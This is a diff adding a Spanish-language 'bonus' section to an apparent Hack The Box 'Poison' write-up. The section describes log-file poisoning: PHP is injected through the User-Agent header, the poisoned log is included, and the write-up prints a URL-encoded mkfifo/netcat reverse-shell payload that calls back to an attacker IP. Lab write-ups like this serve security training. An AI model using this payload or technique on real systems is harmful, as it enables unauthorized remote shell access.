@@ -183,3 +183,31 @@ root    699   0.0  0.7  57812  7052  -  Is   05:06     0:00.05 /usr/sbin/sshd
 
 <img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison13.jpg" width=80% />
 
+
+# BONUS
+
+## POISONING DE ARCHIVOS LOGS
+
+- Agregamos código PHP en el USER-AGENT
+
+<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison14.jpg" width=80% />
+
+- Llamamos al archivo POISONEADO
+
+<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison15.jpg" width=80% />
+
+- Ejecutamos un NETCAT para obtener shell
+
+```
+cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.16.25%20669%20%3E/tmp/f
+```
+
+<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison16.jpg" width=80% />
+
+
+
+
+
+
+
+
